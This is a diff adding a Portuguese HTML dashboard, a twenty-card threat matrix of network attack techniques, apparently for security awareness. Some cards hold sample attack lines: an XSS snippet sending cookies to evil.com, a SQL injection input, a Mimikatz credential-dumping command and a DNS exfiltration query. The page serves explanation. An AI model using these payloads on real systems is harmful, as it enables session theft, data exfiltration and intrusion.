@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Threat Matrix | Intranet & Extranet</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-body: #05070a;
+            --bg-card: #0d1117;
+            --primary-blue: #00d4ff;
+            --primary-red: #ff4d4d;
+            --primary-green: #00ff41;
+            --text-main: #e6edf3;
+            --text-dim: #8b949e;
+            --border-color: #30363d;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; scroll-behavior: smooth; }
+        body { background-color: var(--bg-body); color: var(--text-main); font-family: 'Inter', sans-serif; line-height: 1.5; }
+
+        nav {
+            background: rgba(13, 17, 23, 0.95);
+            border-bottom: 1px solid var(--border-color);
+            padding: 12px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+
+        .logo { font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--primary-blue); text-decoration: none; }
+        .logo span { color: var(--text-main); }
+
+        header {
+            text-align: center;
+            padding: 120px 20px 40px;
+            background: radial-gradient(circle at center, rgba(0, 212, 255, 0.1) 0%, transparent 70%);
+        }
+
+        header h1 { font-size: 2.2rem; font-weight: 900; text-transform: uppercase; letter-spacing: -1px; }
+        header h1 span { color: var(--primary-blue); }
+
+        .main-grid {
+            max-width: 1500px;
+            margin: 0 auto;
+            padding: 20px;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(340px, 1fr));
+            gap: 20px;
+        }
+
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            transition: all 0.2s ease;
+        }
+
+        .card:hover { border-color: var(--primary-blue); box-shadow: 0 5px 15px rgba(0, 212, 255, 0.1); }
+
+        .card-header {
+            padding: 12px 20px;
+            border-bottom: 1px solid var(--border-color);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.9rem;
+            font-weight: 700;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        .badge { font-size: 0.6rem; padding: 2px 6px; border-radius: 3px; font-weight: 400; text-transform: uppercase; }
+        .intra { background: rgba(0, 212, 255, 0.1); color: var(--primary-blue); border: 1px solid var(--primary-blue); }
+        .extra { background: rgba(0, 255, 65, 0.1); color: var(--primary-green); border: 1px solid var(--primary-green); }
+
+        .card-body { padding: 20px; flex-grow: 1; }
+        .card-body p { font-size: 0.85rem; color: var(--text-dim); margin-bottom: 12px; }
+        
+        .code-snippet {
+            background: #010409;
+            padding: 12px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.75rem;
+            color: #d1d5db;
+            margin-bottom: 12px;
+            border-left: 2px solid var(--primary-blue);
+        }
+
+        .code-snippet b { color: var(--primary-red); }
+
+        .alert-box {
+            background: rgba(255, 77, 77, 0.05);
+            border: 1px solid rgba(255, 77, 77, 0.2);
+            padding: 10px;
+            border-radius: 4px;
+            display: flex;
+            gap: 10px;
+            font-size: 0.8rem;
+        }
+
+        .alert-box i { color: var(--primary-red); }
+
+        footer { text-align: center; padding: 40px; color: var(--text-dim); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; border-top: 1px solid var(--border-color); }
+    </style>
+</head>
+<body>
+
+    <nav>
+        <a href="#" class="logo">NETWORK_<span>OBSERVER</span></a>
+        <div style="font-size: 0.7rem; color: var(--text-dim);">LAYER: <span style="color: var(--primary-green);">7_APPLICATION</span></div>
+    </nav>
+
+    <header>
+        <h1>Matriz de Ameaças: <span>Intra & Extranet</span></h1>
+        <p>Monitoramento de vetores de ataque em infraestrutura de rede corporativa e conexões externas.</p>
+    </header>
+
+    <div class="main-grid">
+
+        <div class="card">
+            <div class="card-header">01. Lateral Movement <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Navegação interna após infecção inicial para elevar privilégios e alcançar o Domain Controller.</p>
+                <div class="code-snippet">$ net view /domain<br><b>[EXPL]</b> SMB_Relay_Attack</div>
+                <div class="alert-box"><i class="fas fa-network-wired"></i><div>Falha na segmentação de rede permite acesso irrestrito.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">02. Supply Chain Breach <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Comprometimento de fornecedores com acesso VPN para injetar pacotes maliciosos na rede principal.</p>
+                <div class="code-snippet"><b>SOURCE:</b> VENDOR_API_KEY<br><b>STATUS:</b> Unauthorized_Access</div>
+                <div class="alert-box"><i class="fas fa-link"></i><div>Dependência de segurança de terceiros sem auditoria.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">03. ARP Poisoning (MITM) <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Interceptação de dados em trânsito dentro da rede local falsificando tabelas ARP.</p>
+                <div class="code-snippet"><b>ARP_RESP:</b> Gateway is at [ATTACKER_MAC]</div>
+                <div class="alert-box"><i class="fas fa-user-secret"></i><div>Captura de credenciais trafegando via HTTP ou FTP.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">04. VPN Gateway Exploit <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Exploração de vulnerabilidades em concentradores de VPN para ignorar autenticação.</p>
+                <div class="code-snippet"><b>CVE-2024:</b> Bypass Auth via Buffer Overflow</div>
+                <div class="alert-box"><i class="fas fa-shield-alt"></i><div>Gateways obsoletos são a porta de entrada para ransomware.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">05. LLMNR Poisoning <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Respostas falsas a buscas de nomes de rede para capturar Hashes NTLM de usuários.</p>
+                <div class="code-snippet"><b>TOOL:</b> Responder.py<br><b>HASH:</b> NTLMv2 Captured</div>
+                <div class="alert-box"><i class="fas fa-fingerprint"></i><div>Protocolos legados ativos facilitam roubo de senhas.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">06. Session Hijacking <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Roubo de cookies de sessão de parceiros para acessar portais B2B sem senha.</p>
+                <div class="code-snippet"><b>ID:</b> 992-SESSION-REPLAY<br><b>AUTH:</b> Hijacked</div>
+                <div class="alert-box"><i class="fas fa-cookie"></i><div>Sessões sem expiração ou vinculação de IP são vulneráveis.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">07. Golden Ticket (AD) <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Criação de tickets Kerberos forjados que garantem acesso total vitalício ao domínio.</p>
+                <div class="code-snippet"><b>MIMIKATZ:</b> lsadump::lsa /patch</div>
+                <div class="alert-box"><i class="fas fa-ticket-alt"></i><div>Acesso nível "Deus" ao Active Directory corporativo.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">08. API Key Leakage <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Exposição de chaves de integração em repositórios ou documentação acessível por parceiros.</p>
+                <div class="code-snippet"><b>LOG:</b> Authorization: Bearer [REDACTED]</div>
+                <div class="alert-box"><i class="fas fa-key"></i><div>Permite que o atacante simule ser uma aplicação legítima.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">09. Rogue Access Point <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Instalação de roteadores Wi-Fi não autorizados que burlam o firewall da empresa.</p>
+                <div class="code-snippet"><b>SSID:</b> "FREE_WIFI_CORP" <b>[ROGUE]</b></div>
+                <div class="alert-box"><i class="fas fa-wifi"></i><div>Cria um túnel direto para dentro da rede protegida.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">10. B2B Portal SQLi <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Injeção de comandos SQL em formulários de extranet para vazar dados de outros clientes.</p>
+                <div class="code-snippet"><b>INPUT:</b> ' OR 1=1 -- <b>[INJECTED]</b></div>
+                <div class="alert-box"><i class="fas fa-database"></i><div>Vazamento massivo de dados de parceiros de negócios.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">11. Pass-the-Hash <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Uso de hashes de senhas capturados na memória para autenticar em outros servidores.</p>
+                <div class="code-snippet"><b>AUTH:</b> SMB Login with [HASH]</div>
+                <div class="alert-box"><i class="fas fa-id-card"></i><div>O atacante não precisa da senha real, apenas do hash.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">12. DNS Tunneling <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Exfiltração de dados camuflados como consultas DNS para burlar firewalls de saída.</p>
+                <div class="code-snippet"><b>QUERY:</b> [DATA].malicious.com</div>
+                <div class="alert-box"><i class="fas fa-project-diagram"></i><div>Tráfego oculto em protocolos que parecem inofensivos.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">13. PrintNightmare Exploit <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Uso do serviço de impressão do Windows para obter privilégios de Administrador local.</p>
+                <div class="code-snippet"><b>SPOOLER:</b> RCE via AddPrinterDriver</div>
+                <div class="alert-box"><i class="fas fa-print"></i><div>Serviços secundários vulneráveis derrubam a segurança total.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">14. Insecure Direct Obj Reference <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Manipulação de URLs na Extranet para acessar documentos de outros usuários.</p>
+                <div class="code-snippet"><b>URL:</b> /invoice/1005 -> /invoice/1006</div>
+                <div class="alert-box"><i class="fas fa-folder-open"></i><div>Falha na validação de permissões por registro.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">15. SMB Ghost Attack <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Exploração de vulnerabilidade no protocolo SMBv3 para execução remota de código.</p>
+                <div class="code-snippet"><b>SMBv3:</b> Decompression Vulnerability</div>
+                <div class="alert-box"><i class="fas fa-ghost"></i><div>Ataque silencioso que compromete servidores Windows.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">16. Cross-Site Scripting (XSS) <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Injeção de scripts em portais de suporte para roubar senhas de funcionários.</p>
+                <div class="code-snippet"><b>SCRIPT:</b> fetch('evil.com?c='+doc.cookie)</div>
+                <div class="alert-box"><i class="fas fa-code"></i><div>Execução de código malicioso no navegador do usuário.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">17. Shadow IT <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Uso de softwares não autorizados (ex: AnyDesk pessoal) que abrem brechas de segurança.</p>
+                <div class="code-snippet"><b>PROCESS:</b> remote_access.exe <b>[UNTRUSTED]</b></div>
+                <div class="alert-box"><i class="fas fa-cloud-upload-alt"></i><div>Ferramentas úteis para usuários, fatais para a TI.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">18. Credential Brute Forcing <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Tentativas massivas de login em portais VPN/Extranet usando dicionários de senhas.</p>
+                <div class="code-snippet"><b>LOG:</b> 500 failed login attempts/min</div>
+                <div class="alert-box"><i class="fas fa-hammer"></i><div>Ausência de bloqueio de IP ou MFA facilita o ataque.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">19. VLAN Hopping <span class="badge intra">Intranet</span></div>
+            <div class="card-body">
+                <p>Ataque que permite ao invasor saltar de uma rede convidada para a rede administrativa.</p>
+                <div class="code-snippet"><b>PROTO:</b> 802.1Q Double Tagging</div>
+                <div class="alert-box"><i class="fas fa-random"></i><div>A segmentação lógica de rede falhou devido a má configuração.</div></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">20. Distributed DoS <span class="badge extra">Extranet</span></div>
+            <div class="card-body">
+                <p>Sobrecarga do gateway da Extranet para derrubar a comunicação com parceiros e clientes.</p>
+                <div class="code-snippet"><b>TRAFFIC:</b> 10Gbps SYN_FLOOD Detected</div>
+                <div class="alert-box"><i class="fas fa-dizzy"></i><div>Interrupção de serviços críticos de negócios externos.</div></div>
+            </div>
+        </div>
+
+    </div>
+
+    <footer>
+        LOG_SESSION: SECURITY_MATRIX_2026 | PROTECTING ASSETS | ENCRYPT EVERYTHING
+    </footer>
+
+</body>
+</html>
